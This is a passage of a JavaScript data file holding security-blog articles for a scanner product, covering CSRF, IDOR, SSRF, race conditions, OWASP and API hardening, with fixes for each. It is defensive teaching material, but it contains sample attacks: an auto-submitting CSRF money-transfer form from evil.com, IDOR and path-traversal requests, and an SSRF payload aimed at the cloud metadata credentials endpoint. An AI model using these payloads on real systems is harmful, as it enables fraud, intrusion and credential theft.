+<span class="keyword">const</span> { name, email, bio } = req.body; <span class="comment">// Only these fields are user-editable</span>
+<span class="keyword">await</span> User.update({ id }, { name, email, bio });</code></pre>
+
+<div class="progress-tracker">
+  <div class="pt-title"> API Security Checklist (12/12)</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Authenticate all non-public routes</div>
+    <div class="pt-step done">Rate limit all endpoints (strict on auth)</div>
+    <div class="pt-step done">Validate all input with a schema library</div>
+    <div class="pt-step done">Whitelist CORS origins — never use wildcard in production</div>
+    <div class="pt-step done">Prevent mass assignment — explicitly pick allowed fields</div>
+    <div class="pt-step done">Force HTTPS — reject HTTP requests</div>
+    <div class="pt-step done">Version your API — /api/v1/ paths</div>
+    <div class="pt-step done">Return generic error messages — no stack traces to clients</div>
+    <div class="pt-step done">Log all API requests with user ID, IP, and timestamp</div>
+    <div class="pt-step done">Check authorization on every object access (IDOR prevention)</div>
+    <div class="pt-step done">Paginate all list endpoints — never return unbounded results</div>
+    <div class="pt-step">Run npm audit / pip-audit — fix critical dependencies</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // CSRF
+  // ─────────────────────────────────────────────
+  'csrf-guide': {
+    title: 'CSRF Attacks Explained: How a Single Click Can Drain a Bank Account',
+    excerpt: 'Cross-Site Request Forgery is one of the easiest attacks to execute and one of the most overlooked protections. Includes a working demo and SameSite cookie fix.',
+    tags: [['CSRF','tag-red'],['Beginner','tag-green'],['How-To','tag-cyan']],
+    author: { initials:'KM', name:'Kwame Mensah', role:'Head of Product', color:'rgba(0,255,135,0.15)', textColor:'var(--green)' },
+    date: 'February 22, 2025', readTime: '8 min read',
+    difficulty: 'easy',
+    toc: ['What is CSRF?','How the attack works','Real-world example','SameSite cookie fix','CSRF token fix','Double-submit cookie','Checklist'],
+    relatedSlugs: ['xss-complete-guide','broken-auth-guide','http-headers-guide'],
+    content: `
+<h2 id="what-is-csrf">What is CSRF?</h2>
+<p>Cross-Site Request Forgery (CSRF) tricks an authenticated user's browser into making an unintended request to a web application. Because the request comes from the user's browser, it includes their session cookies — making the server think the request is legitimate.</p>
+
+<h2 id="how-the-attack-works">How the Attack Works</h2>
+<ol>
+  <li>Alice logs in to her bank at <code>bank.com</code>. Her browser stores a session cookie.</li>
+  <li>Alice visits <code>evil.com</code> (while still logged in to <code>bank.com</code>).</li>
+  <li><code>evil.com</code> contains a hidden form that auto-submits to <code>bank.com/transfer</code>.</li>
+  <li>Alice's browser sends the transfer request — with her session cookie attached automatically.</li>
+  <li>The bank processes the transfer as if Alice approved it.</li>
+</ol>
+
+<h2 id="real-world-example">The Malicious Page</h2>
+<pre><code><span class="comment">&lt;!-- On evil.com — auto-submits when Alice visits --&gt;</span>
+<span class="danger">&lt;form id="csrf" action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input name="to"     value="attacker-account" /&gt;
+  &lt;input name="amount" value="5000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;</span>
+
+<span class="comment">&lt;!-- Alice's session cookie is included automatically by the browser --&gt;</span>
+<span class="comment">&lt;!-- Bank processes the transfer thinking Alice approved it --&gt;</span></code></pre>
+
+<h2 id="samesite-cookie-fix">Fix 1 — SameSite Cookie Attribute (Easiest Fix)</h2>
+<p>The <code>SameSite</code> cookie attribute tells the browser not to send the session cookie on cross-site requests. This single flag stops most CSRF attacks.</p>
+<pre><code><span class="comment">// Node.js / Express</span>
+res.cookie(<span class="string">'session'</span>, token, {
+  httpOnly: <span class="keyword">true</span>,
+  secure: <span class="keyword">true</span>,
+  sameSite: <span class="string">'strict'</span>  <span class="comment">// Browser won't send cookie on cross-site requests</span>
+  <span class="comment">// Use 'lax' if you need cross-site GET requests (links)</span>
+});</code></pre>
+
+<h2 id="csrf-token-fix">Fix 2 — CSRF Tokens (Server-Side Verification)</h2>
+<p>Generate a unique, unpredictable token per session. Include it in every form as a hidden field. Verify it server-side on every state-changing request.</p>
+<pre><code><span class="keyword">const</span> csrf = <span class="keyword">require</span>(<span class="string">'csurf'</span>); <span class="comment">// Express middleware</span>
+app.use(csrf({ cookie: <span class="keyword">true</span> }));
+
+<span class="comment">// In your form template:</span>
+&lt;form method="POST" action="/transfer"&gt;
+  &lt;input type="hidden" name="_csrf" value="&lt;%= csrfToken() %&gt;" /&gt;
+  <span class="comment">&lt;!-- The attacker can't read this token from evil.com --&gt;</span>
+&lt;/form&gt;</code></pre>
+
+<h2 id="double-submit-cookie">Fix 3 — Double Submit Cookie (APIs)</h2>
+<p>For SPAs and APIs that can't use server-side sessions, use the double-submit cookie pattern.</p>
+<pre><code><span class="comment">// Client reads the CSRF token from cookie and sends it in a header:</span>
+<span class="keyword">const</span> csrfToken = document.cookie.match(/csrf=([^;]+)/)?.[1];
+fetch(<span class="string">'/api/transfer'</span>, {
+  method: <span class="string">'POST'</span>,
+  headers: { <span class="string">'X-CSRF-Token'</span>: csrfToken } <span class="comment">// Attacker can't set this header cross-origin</span>
+});
+
+<span class="comment">// Server verifies header matches cookie:</span>
+<span class="keyword">if</span> (req.headers[<span class="string">'x-csrf-token'</span>] !== req.cookies.csrf) {
+  <span class="keyword">return</span> res.status(403).json({ error: <span class="string">'CSRF validation failed'</span> });
+}</code></pre>
+
+<div class="progress-tracker">
+  <div class="pt-title"> CSRF Protection Checklist</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Set SameSite=Strict on session cookies</div>
+    <div class="pt-step done">Use CSRF tokens on all state-changing forms</div>
+    <div class="pt-step done">Verify Origin/Referer headers on sensitive endpoints</div>
+    <div class="pt-step done">Use X-CSRF-Token header pattern for APIs</div>
+    <div class="pt-step">Run PenChecker to verify CSRF protections are in place</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // IDOR
+  // ─────────────────────────────────────────────
+  'idor-guide': {
+    title: 'IDOR Vulnerabilities: How Attackers Access Other Users\' Data With One URL Change',
+    excerpt: 'Insecure Direct Object Reference is behind some of the biggest data exposure incidents. How it works, how to test for it, and how to fix it with proper authorization.',
+    tags: [['IDOR','tag-purple'],['OWASP A01','tag-red'],['Intermediate','tag-cyan']],
+    author: { initials:'SA', name:'Sara Abdi', role:'Security Research Lead', color:'rgba(255,59,92,0.15)', textColor:'var(--red)' },
+    date: 'February 12, 2025', readTime: '9 min read',
+    difficulty: 'intermediate',
+    toc: ['What is IDOR?','Classic examples','How attackers find it','Why it\'s hard to catch','Fix — Authorization checks','Fix — Indirect references','Testing checklist'],
+    relatedSlugs: ['broken-auth-guide','api-security-guide','scanner-accuracy-guide'],
+    content: `
+<h2 id="what-is-idor">What is IDOR?</h2>
+<p>Insecure Direct Object Reference (IDOR) occurs when an application uses user-controllable input to access objects directly — without verifying the user is authorized to access that specific object. It's the #1 OWASP category because it's incredibly common and often leads to complete data exposure.</p>
+
+<h2 id="classic-examples">Classic Examples</h2>
+<pre><code><span class="comment">// The attacker changes one number in the URL:</span>
+GET /api/users/<span class="string">123</span>/profile  <span class="comment">→ Their own profile (authorized)</span>
+GET /api/users/<span class="danger">124</span>/profile  <span class="comment">→ Someone else's profile (unauthorized!)</span>
+
+<span class="comment">// Or in request body:</span>
+POST /api/orders/export
+{ "orderId": <span class="danger">99847</span> }  <span class="comment">// Another user's order ID — returned without auth check</span>
+
+<span class="comment">// Or file access:</span>
+GET /documents/download?file=<span class="danger">../users/admin/private.pdf</span></code></pre>
+
+<h2 id="how-attackers-find-it">How Attackers Find IDOR</h2>
+<p>Most IDOR vulnerabilities are found by:</p>
+<ol>
+  <li>Creating two accounts (attacker + victim)</li>
+  <li>Creating a resource as the victim (an order, a file, a profile)</li>
+  <li>Noting the resource ID from the victim's account</li>
+  <li>Accessing that resource ID while authenticated as the attacker</li>
+  <li>If the data is returned — IDOR confirmed</li>
+</ol>
+
+<h2 id="fix-authorization-checks">Fix — Always Check Authorization</h2>
+<p>The fix is simple but must be consistently applied: <strong>verify that the authenticated user is authorized to access the specific resource they are requesting.</strong></p>
+<pre><code><span class="comment">//  Vulnerable — no authorization check:</span>
+<span class="danger">app.get('/api/orders/:id', async (req, res) => {
+  const order = await Order.findById(req.params.id);
+  res.json(order); // Returns any order to any user!
+});</span>
+
+<span class="comment">//  Fixed — check ownership:</span>
+app.get(<span class="string">'/api/orders/:id'</span>, authMiddleware, <span class="keyword">async</span> (req, res) => {
+  <span class="keyword">const</span> order = <span class="keyword">await</span> Order.findById(req.params.id);
+  <span class="keyword">if</span> (!order) <span class="keyword">return</span> res.status(404).json({ error: <span class="string">'Not found'</span> });
+  <span class="keyword">if</span> (order.userId !== req.user.id) { <span class="comment">// Ownership check</span>
+    <span class="keyword">return</span> res.status(403).json({ error: <span class="string">'Access denied'</span> });
+  }
+  res.json(order);
+});</code></pre>
+
+<h2 id="fix-indirect-references">Fix — Use Indirect Object References</h2>
+<p>Instead of using sequential numeric IDs in your API, use UUIDs. They are not enumerable — an attacker can't simply increment by 1 to access other records.</p>
+<pre><code><span class="comment">//  Sequential ID — easily enumerable:</span>
+<span class="danger">/api/users/1, /api/users/2, /api/users/3...</span>
+
+<span class="comment">//  UUID — not enumerable:</span>
+/api/users/550e8400-e29b-41d4-a716-446655440000
+
+<span class="comment">// Generate UUID in Node.js:</span>
+<span class="keyword">const</span> { v4: uuidv4 } = <span class="keyword">require</span>(<span class="string">'uuid'</span>);
+<span class="keyword">const</span> userId = uuidv4();  <span class="comment">// '9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d'</span></code></pre>
+
+<div class="progress-tracker">
+  <div class="pt-title"> IDOR Prevention Checklist</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Check authorization on EVERY object access — not just authentication</div>
+    <div class="pt-step done">Use UUIDs instead of sequential numeric IDs</div>
+    <div class="pt-step done">Never return objects based solely on ID without ownership check</div>
+    <div class="pt-step done">Test with two separate user accounts before going live</div>
+    <div class="pt-step done">Log all access attempts to sensitive resources</div>
+    <div class="pt-step">Run PenChecker API security scan to check for IDOR patterns</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // PENCHECKER TUTORIAL
+  // ─────────────────────────────────────────────
+  'penchecker-tutorial': {
+    title: 'How to Scan Your Website With PenChecker and Understand the Results',
+    excerpt: 'A step-by-step walkthrough of running your first scan, reading the report, understanding each finding, and using the AI assistant to fix vulnerabilities.',
+    tags: [['Tutorial','tag-cyan'],['Beginner','tag-green'],['PenChecker','tag-orange']],
+    author: { initials:'AO', name:'Adewale Okonkwo', role:'Founder & CEO', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+    date: 'February 18, 2025', readTime: '6 min read',
+    difficulty: 'easy',
+    toc: ['Step 1: Create account','Step 2: Add your domain','Step 3: Run a scan','Step 4: Read the report','Step 5: Use the AI assistant','Step 6: Fix and rescan'],
+    relatedSlugs: ['http-headers-guide','scanner-accuracy-guide','ssl-tls-guide'],
+    content: `
+<h2 id="step-1">Step 1: Create Your Account</h2>
+<p>Go to <a href="../signup.html">penchecker.io/signup</a> and create a free account. The Free plan gives you 3 scans per week — more than enough to get started. No credit card required.</p>
+
+<h2 id="step-2">Step 2: Verify Domain Ownership</h2>
+<p>Before scanning, you must confirm you own the domain. PenChecker supports three verification methods:</p>
+<ul>
+  <li><strong>DNS TXT record</strong> — Add a TXT record to your domain's DNS settings (recommended)</li>
+  <li><strong>File upload</strong> — Place a verification file at <code>yoursite.com/.well-known/penchecker.txt</code></li>
+  <li><strong>Meta tag</strong> — Add a meta tag to your homepage</li>
+</ul>
+<div class="ab-highlight tip"><div class="ab-highlight-label"> Why We Require Verification</div><p>Domain verification protects both you and third parties. It's logged permanently with your user ID and timestamp. Scanning someone else's domain without permission is illegal in most jurisdictions.</p></div>
+
+<h2 id="step-3">Step 3: Run Your First Scan</h2>
+<p>From your dashboard, click "New Scan" and enter your domain. Choose your scan settings:</p>
+<ul>
+  <li><strong>Scan type:</strong> Quick (2 min), Standard (8 min), or Deep (20+ min)</li>
+  <li><strong>Mode:</strong> Passive (reads headers only, zero risk) or Active (probes for vulnerabilities)</li>
+  <li><strong>Industry profile:</strong> E-commerce, Healthcare, Fintech, Blog, SaaS, or General</li>
+</ul>
+<p>For your first scan, use <strong>Standard + Active + General</strong>. You'll see the scan progress in real time — what pages are being crawled, what tests are running, and what's being found.</p>
+
+<h2 id="step-4">Step 4: Reading Your Report</h2>
+<p>When the scan completes, your report shows:</p>
+<ul>
+  <li><strong>Security Score</strong> — Your overall score out of 10</li>
+  <li><strong>Findings by severity</strong> — Critical, High, Medium, Low, Informational</li>
+  <li>For each finding: the vulnerability type, evidence (actual server response), confidence score, affected URL, and fix difficulty rating</li>
+</ul>
+<div class="ab-highlight success"><div class="ab-highlight-label"> Plain English Mode</div><p>Toggle "Plain English" mode to switch the entire report from technical jargon to human-readable explanations. Useful when sharing the report with non-technical stakeholders.</p></div>
+
+<h2 id="step-5">Step 5: Using the AI Assistant</h2>
+<p>Click on any vulnerability in your report, then open the AI chat assistant. It automatically loads with the context of that specific finding. Ask it anything:</p>
+<ul>
+  <li><em>"Explain this vulnerability in simple terms"</em></li>
+  <li><em>"Generate the fix code for Express.js"</em></li>
+  <li><em>"How urgent is this compared to my other findings?"</em></li>
+  <li><em>"What would an attacker actually do with this?"</em></li>
+</ul>
+<p>The AI knows your full scan, your technology stack, and can generate working code for your exact framework.</p>
+
+<h2 id="step-6">Step 6: Fix and Rescan</h2>
+<p>After fixing a vulnerability, use the "Rescan this finding" button in the report. This runs a targeted check on just that specific issue — no need to re-run the full scan. When it comes back clean, the finding is marked as remediated and your security score updates automatically.</p>
+
+<div class="progress-tracker">
+  <div class="pt-title"> Your First Scan Checklist</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Create free account at penchecker.io/signup</div>
+    <div class="pt-step done">Verify domain ownership (DNS, file, or meta tag)</div>
+    <div class="pt-step done">Run Standard scan with Active mode</div>
+    <div class="pt-step done">Review findings — check severity and evidence</div>
+    <div class="pt-step done">Use AI assistant to get fix code for your stack</div>
+    <div class="pt-step">Fix Critical and High findings first</div>
+    <div class="pt-step">Rescan each fixed vulnerability individually</div>
+    <div class="pt-step">Enable continuous monitoring for ongoing protection</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // WHAT IS SECURITY
+  // ─────────────────────────────────────────────
+  'what-is-security': {
+    title: 'What is Web Application Security? A Developer\'s Introduction',
+    excerpt: 'The fundamental guide to web security. Learn about the client-server model, trust boundaries, HTTPS encryption, and the defense-in-depth security mindset.',
+    tags: [['Foundations','tag-green'],['Beginner','tag-cyan']],
+    author: { initials:'AO', name:'Adewale Okonkwo', role:'Founder & CEO', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+    date: 'February 12, 2025', readTime: '5 min read',
+    difficulty: 'easy',
+    toc: ['Introduction','The client-server model','Understanding trust boundaries','Why HTTPS is mandatory','Defense in depth','Summary'],
+    relatedSlugs: ['http-headers-guide','owasp-intro','ssl-tls-guide'],
+    content: `
+<h2 id="introduction">Introduction to Web Application Security</h2>
+<p>Web application security is the practice of protecting websites, applications, and APIs from malicious attacks and exploitation. For developers, security is not an addon product; it is a core feature of your software architecture. Writing secure code requires understanding how clients and servers interact, where trust boundaries lie, and how to apply the principle of least privilege.</p>
+
+<h2 id="the-client-server-model">The Client-Server Model and the Danger of Trusting Clients</h2>
+<p>In web development, the client (usually a browser) sends HTTP requests, and the server processes those requests and returns HTTP responses. <strong>Rule #1 of Web Security is: Never trust the client.</strong> Attackers can bypass any client-side verification, modify headers, submit malformed payloads, and intercept client traffic.</p>
+<div class="ab-highlight warning"><div class="ab-highlight-label"> Crucial Warning</div><p>Never rely solely on client-side validation (like HTML5 <code>required</code> attributes or JavaScript format checks). These are great for user experience, but they provide zero security. An attacker can use curl or Postman to send arbitrary requests directly to your API.</p></div>
+
+<h2 id="understanding-trust-boundaries">Understanding Trust Boundaries</h2>
+<p>A trust boundary is where untrusted data (such as user input, query parameters, headers, or cookies) enters your trusted application environment. Everything outside the trust boundary is hostile. When untrusted data crosses into your backend, it must be validated, sanitized, and safely parsed.</p>
+
+<h2 id="why-https-is-mandatory">Why HTTPS is Mandatory</h2>
+<p>HTTP transmits data in plain text, making it vulnerable to eavesdropping and man-in-the-middle (MITM) attacks. HTTPS encrypts this data using TLS (Transport Layer Security). If you run your site over HTTP, anyone on the same Wi-Fi network or ISP routing path can capture your users' passwords, session identifiers, and personal data.</p>
+
+<h2 id="defense-in-depth">The Defense-in-Depth Mindset</h2>
+<p>Defense-in-depth means applying multiple layers of security so that if one layer fails, others are there to block the attack. For example:</p>
+<ul>
+  <li>Layer 1: HTTPS & SSL/TLS Configuration (prevents interception)</li>
+  <li>Layer 2: WAF & Rate Limiting (blocks brute-force and DDoS)</li>
+  <li>Layer 3: Proper Authentication & Session Management (protects access)</li>
+  <li>Layer 4: Secure Code (prevents XSS, SQLi, IDOR)</li>
+  <li>Layer 5: Database Permissions (limits database damage)</li>
+</ul>
+
+<div class="progress-tracker">
+  <div class="pt-title"> Web Security Fundamentals Checklist</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Always run application over HTTPS with HSTS enabled</div>
+    <div class="pt-step done">Implement server-side input validation for all API inputs</div>
+    <div class="pt-step done">Sanitize and escape output before rendering to HTML</div>
+    <div class="pt-step done">Keep all server dependencies and packages updated</div>
+    <div class="pt-step">Perform regular security scanning using PenChecker</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // OWASP INTRO
+  // ─────────────────────────────────────────────
+  'owasp-intro': {
+    title: 'Understanding the OWASP Top 10: How to Secure Modern Apps',
+    excerpt: 'The OWASP Top 10 is the industry-standard list of the most critical security risks. We explain each category and what developers need to know to secure their apps.',
+    tags: [['OWASP','tag-red'],['Beginner','tag-cyan'],['Overview','tag-purple']],
+    author: { initials:'SA', name:'Sara Abdi', role:'Security Research Lead', color:'rgba(255,59,92,0.15)', textColor:'var(--red)' },
+    date: 'February 6, 2025', readTime: '7 min read',
+    difficulty: 'easy',
+    toc: ['What is OWASP?','The OWASP Top 10 list','How to use this series','Next steps'],
+    relatedSlugs: ['what-is-security','owasp-a01','sql-injection-guide'],
+    content: `
+<h2 id="what-is-owasp">What is OWASP?</h2>
+<p>The Open Web Application Security Project (OWASP) is a non-profit foundation dedicated to improving software security. Their most famous resource is the <strong>OWASP Top 10</strong>, a consensus report based on vulnerability data from thousands of companies. It represents a broad agreement on the most critical security risks facing web applications today.</p>
+
+<h2 id="the-owasp-top-10-list">The OWASP Top 10 Categories (2021 Version)</h2>
+<p>Here is a summary of the current OWASP Top 10 categories, ordered by frequency and severity:</p>
+<ol>
+  <li><strong>A01:2021 — Broken Access Control:</strong> Bypassing authorization checks to access data or perform actions belonging to other users.</li>
+  <li><strong>A02:2021 — Cryptographic Failures:</strong> Data exposure in transit or at rest, usually caused by weak hashes, lack of encryption, or insecure certificates.</li>
+  <li><strong>A03:2021 — Injection:</strong> Including user input into code commands (e.g. SQL, command, or script injection) causing unintended execution.</li>
+  <li><strong>A04:2021 — Insecure Design:</strong> Design flaws in architecture and threat modeling before any code is written.</li>
+  <li><strong>A05:2021 — Security Misconfiguration:</strong> Default accounts, open ports, verbose error handling, and outdated headers.</li>
+  <li><strong>A06:2021 — Vulnerable and Outdated Components:</strong> Unpatched libraries, packages, or base servers.</li>
+  <li><strong>A07:2021 — Identification and Authentication Failures:</strong> Predictable session tokens, weak password policies, and lack of rate limiting.</li>
+  <li><strong>A08:2021 — Software and Data Integrity Failures:</strong> Untrusted deserialization and supply chain compromises.</li>
+  <li><strong>A09:2021 — Security Logging and Monitoring Failures:</strong> Insufficient logging of attacks, preventing breach detection.</li>
+  <li><strong>A10:2021 — Server-Side Request Forgery (SSRF):</strong> Forcing a server to request internal or restricted resources.</li>
+</ol>
+
+<div class="ab-highlight tip"><div class="ab-highlight-label"> Actionable Advice</div><p>Do not try to fix everything at once. Focus on <strong>A01 (Broken Access Control)</strong>, <strong>A03 (Injection)</strong>, and <strong>A07 (Authentication Failures)</strong> first, as these are the most common entry points for attackers.</p></div>
+
+<h2 id="how-to-use-this-series">How to Use This Series</h2>
+<p>Each category of the OWASP Top 10 is covered in depth on the PenChecker blog, complete with real code examples and fixed snippets. Browse through the related articles below to dive deep into each topic.</p>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // SUBDOMAIN ENUM
+  // ─────────────────────────────────────────────
+  'subdomain-enum': {
+    title: 'Subdomain Enumeration & Mapping: Finding the Hidden Attack Surface',
+    excerpt: 'How attackers discover your hidden staging servers, dev portals, and staging environments, and how you can map your DNS records to prevent takeovers.',
+    tags: [['Recon','tag-yellow'],['Advanced','tag-red']],
+    author: { initials:'KM', name:'Kwame Mensah', role:'Head of Product', color:'rgba(255,140,66,0.15)', textColor:'var(--orange)' },
+    date: 'February 2, 2025', readTime: '8 min read',
+    difficulty: 'hard',
+    toc: ['What is subdomain enumeration?','Passive vs active recon','Why subdomains are target #1','Subdomain takeover vulnerability','DNS mapping prevention'],
+    relatedSlugs: ['scanner-accuracy-guide','ssrf-guide','cicd-security'],
+    content: `
+<h2 id="what-is-subdomain-enumeration">What is Subdomain Enumeration?</h2>
+<p>Subdomain enumeration is the process of finding all subdomains of a target domain (e.g. <code>staging.yoursite.com</code>, <code>dev.yoursite.com</code>). For security engineers, this is critical because staging or development environments are often configured with weaker security controls than production but share database access or credentials.</p>
+
+<h2 id="passive-vs-active-recon">Passive vs Active Reconnaissance</h2>
+<p>Attackers use two main strategies to discover subdomains:</p>
+<ul>
+  <li><strong>Passive Enumeration:</strong> Gathering information without touching the target. Attackers query Certificate Transparency (CT) logs, search engines (Google dorking), and DNS aggregators. This is 100% silent.</li>
+  <li><strong>Active Enumeration:</strong> Querying the target directly. This includes brute-forcing subdomains with wordlists, running reverse DNS lookups, or executing DNS zone transfers.</li>
+</ul>
+
+<h2 id="why-subdomains-are-target-1">Why Subdomains Are Target #1</h2>
+<p>Development portals, administrative dashboards, and internal APIs are frequently hosted on subdomains. Because developers assume these are hidden, they might leave debug logging enabled, omit multi-factor authentication, or run unpatched software.</p>
+
+<h2 id="subdomain-takeover-vulnerability">Subdomain Takeover Vulnerability (Critical Risk)</h2>
+<p>A subdomain takeover occurs when a subdomain points to a third-party service (like AWS S3, GitHub Pages, or Zendesk) that has been decommissioned or deleted, but the DNS CNAME record remains active. An attacker can register that name on the third-party service and host malicious content on your trusted subdomain.</p>
+<div class="ab-highlight warning"><div class="ab-highlight-label"> Real Risk</div><p>If an attacker takes over <code>support.yoursite.com</code>, they can steal authentication cookies scoped to <code>.yoursite.com</code>, bypass CORS controls, or run highly convincing phishing attacks.</p></div>
+
+<h2 id="dns-mapping-prevention">DNS Mapping & Prevention</h2>
+<p>Clean up your DNS records. If you stop using an S3 bucket or external service, delete the DNS CNAME record immediately. Regularly map your entire DNS zone to find orphaned records.</p>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // SSRF GUIDE
+  // ─────────────────────────────────────────────
+  'ssrf-guide': {
+    title: 'SSRF (Server-Side Request Forgery): Bypassing Firewalls from the Inside',
+    excerpt: 'Server-Side Request Forgery is one of the most dangerous vulnerabilities in modern cloud apps. Learn how attackers target internal networks and metadata services.',
+    tags: [['SSRF','tag-red'],['OWASP A10','tag-red'],['Advanced','tag-purple']],
+    author: { initials:'SA', name:'Sara Abdi', role:'Security Research Lead', color:'rgba(168,85,247,0.15)', textColor:'var(--purple)' },
+    date: 'January 28, 2025', readTime: '10 min read',
+    difficulty: 'hard',
+    toc: ['Understanding SSRF','How attackers exploit SSRF','Targeting cloud metadata','Mitigation & secure code','Checklist'],
+    relatedSlugs: ['api-security-guide','subdomain-enum','idor-guide'],
+    content: `
+<h2 id="understanding-ssrf">Understanding Server-Side Request Forgery</h2>
+<p>Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource (such as a profile picture from a URL) without validating the destination. An attacker can supply an internal IP address or metadata URL, forcing the server to make requests inside your private network — bypassing firewalls, security groups, and local access checks.</p>
+
+<h2 id="how-attackers-exploit-ssrf">How Attackers Exploit SSRF</h2>
+<p>Imagine a function that fetches an image from a URL provided in the query string:</p>
+<pre><code><span class="comment">// Vulnerable Node.js code</span>
+app.get(<span class="string">'/fetch-image'</span>, <span class="keyword">async</span> (req, res) => {
+  <span class="keyword">const</span> url = req.query.url;
+  <span class="comment">// Attacker sends: /fetch-image?url=http://127.0.0.1:8080/admin</span>
+  <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(<span class="danger">url</span>);
+  res.send(response.data);
+});</code></pre>
+<p>The server is running inside the firewall. It can access internal services (like local microservices or databases) that are not exposed to the public internet.</p>
+
+<h2 id="targeting-cloud-metadata">Targeting Cloud Metadata APIs</h2>
+<p>In AWS, Google Cloud, or Azure, servers have access to a local metadata endpoint at <code>http://169.254.169.254/</code>. This endpoint contains instance credentials, private keys, and environment variables. Forcing a server to call this endpoint via SSRF is a primary way attackers steal cloud accounts.</p>
+<div class="ab-highlight warning"><div class="ab-highlight-label"> Critical Endpoint</div><p><strong>http://169.254.169.254/latest/meta-data/iam/security-credentials/</strong> contains AWS temporary credentials. SSRF on a cloud instance can compromise the entire cloud infrastructure.</p></div>
+
+<h2 id="mitigation-secure-code">Mitigation and Secure Code</h2>
+<p>To prevent SSRF, do not accept arbitrary URLs. Instead, validate all URLs against a strict domain whitelist, block requests to private IP ranges (RFC 1918), and restrict protocols to HTTP/HTTPS only.</p>
+<pre><code><span class="comment">// Fixed Node.js validation</span>
+<span class="keyword">const</span> url = <span class="keyword">require</span>(<span class="string">'url'</span>);
+<span class="keyword">const</span> ip = <span class="keyword">require</span>(<span class="string">'ip'</span>);
+
+<span class="keyword">function</span> isSafeUrl(inputUrl) {
+  <span class="keyword">const</span> parsed = url.parse(inputUrl);
+  <span class="keyword">if</span> (parsed.protocol !== <span class="string">'http:'</span> && parsed.protocol !== <span class="string">'https:'</span>) <span class="keyword">return false</span>;
+  <span class="keyword">const</span> hostIp = getDomainIp(parsed.hostname);
+  <span class="keyword">if</span> (ip.isLoopback(hostIp) || ip.isPrivate(hostIp)) <span class="keyword">return false</span>;
+  <span class="keyword">return true</span>;
+}</code></pre>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // RACE CONDITIONS
+  // ─────────────────────────────────────────────
+  'race-conditions': {
+    title: 'Race Conditions in Web Applications: When Concurrency Becomes a Vulnerability',
+    excerpt: 'Race conditions are timing flaws that can bypass business rules, duplicate balances, or leak sessions. Learn how they work and how to fix them.',
+    tags: [['Concurrency','tag-purple'],['Advanced','tag-red']],
+    author: { initials:'TN', name:'Tunde Nwosu', role:'Backend Engineer', color:'rgba(255,214,10,0.15)', textColor:'var(--yellow)' },
+    date: 'January 22, 2025', readTime: '9 min read',
+    difficulty: 'hard',
+    toc: ['What is a race condition?','Exploitation: double spend','Why single-threaded Node.js is vulnerable','Database-level locking fixes','Summary'],
+    relatedSlugs: ['sql-injection-guide','api-security-guide','cicd-security'],
+    content: `
+<h2 id="what-is-a-race-condition">What is a Race Condition?</h2>
+<p>A race condition occurs when a program performs multiple operations concurrently, and the security or correctness of the application depends on the order or timing of those operations. In web apps, this usually happens when two database requests arrive at the exact same millisecond, allowing business logic to be bypassed.</p>
+
+<h2 id="exploitation-double-spend">Exploitation: The Double Spend Attack</h2>
+<p>Imagine a transfer function that checks if a user has sufficient balance before executing a withdrawal:</p>
+<pre><code><span class="comment">// Vulnerable logic:</span>
+1. Get current balance (e.g. $100)
+2. Verify if withdrawal amount is less than balance (withdrawal: $100)
+3. Deduct amount ($100 - $100 = $0)
+4. Send money to recipient</code></pre>
+<p>If an attacker sends <strong>two requests at the exact same millisecond</strong>, both requests might hit Step 1 at the same time. Both requests see a balance of $100. Both requests pass Step 2. Both requests deduct $100, resulting in the account going to -$100 (or duplicate transfers), bypassing the balance check.</p>
+
+<h2 id="why-single-threaded-node-js-is-vulnerable">Why Node.js is Still Vulnerable</h2>
+<p>Developers often think Node.js is safe from race conditions because it runs on a single event loop. This is a myth. While JavaScript code execution is single-threaded, <strong>database queries and network operations are asynchronous</strong>. As soon as you run an asynchronous <code>await db.query(...)</code>, the event loop yields to other requests, allowing concurrent timing attacks.</p>
+
+<h2 id="database-level-locking-fixes">The Fix — Database-Level Locking & Transactions</h2>
+<p>To prevent race conditions, queries that read and write balances or sessions must be executed atomically or locked. In SQL databases, use row-level locking (<code>SELECT ... FOR UPDATE</code>) or database constraints:</p>
+<pre><code><span class="comment">// Safe SQL with locking inside transaction</span>
+BEGIN TRANSACTION;
+SELECT balance FROM accounts WHERE id = 1 <span class="keyword">FOR UPDATE</span>;
+UPDATE accounts SET balance = balance - 100 WHERE id = 1;
+COMMIT;</code></pre>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // CI/CD SECURITY
+  // ─────────────────────────────────────────────
+  'cicd-security': {
+    title: 'Securing Your CI/CD Pipeline: Stopping Supply Chain Attacks',
+    excerpt: 'Your deployment pipeline has full access to your production servers. Learn how to secure GitHub Actions, manage secrets, and prevent supply chain attacks.',
+    tags: [['DevOps','tag-green'],['Security','tag-purple'],['Advanced','tag-red']],
+    author: { initials:'FK', name:'Fatima Koné', role:'CTO & Lead Engineer', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+    date: 'January 18, 2025', readTime: '8 min read',
+    difficulty: 'hard',
+    toc: ['CI/CD as an entry point','GitHub Actions best practices','Secrets management','Dependency audits','Pipeline hardening'],
+    relatedSlugs: ['subdomain-enum','http-headers-guide','api-security-guide'],
+    content: `
+<h2 id="cicd-as-an-entry-point">CI/CD as an Entry Point</h2>
